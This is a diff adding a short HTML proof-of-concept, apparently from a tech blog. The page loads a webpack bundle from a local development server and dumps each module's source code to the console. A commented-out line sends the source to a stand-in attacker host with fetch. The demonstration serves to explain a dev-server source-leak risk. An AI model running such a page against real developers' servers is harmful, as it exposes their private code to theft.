@@ -1,0 +1,21 @@
+<html>
+  <head></head>
+  <body>
+    <script src="http://localhost:3000/main.js"></script>
+    <script>
+      const webpackChunkKey = Object.keys(window).find((key) =>
+        key.startsWith("webpackChunk"),
+      );
+      // the source code is packed in this object `window[webpackChunkKey][0][1]`
+      Object.keys(window[webpackChunkKey][0][1]).forEach((key) => {
+        console.log(key);
+        // calling `toString()` to get the source code
+        const sourceCode =
+          window.webpackChunkyusheng_tech_blog[0][1][key].toString();
+        console.log(sourceCode);
+        // The Attacker can send these source code to his server now
+        // fetch(`https://attacker.website/?sourceCode=${sourceCode}`)
+      });
+    </script>
+  </body>
+</html>
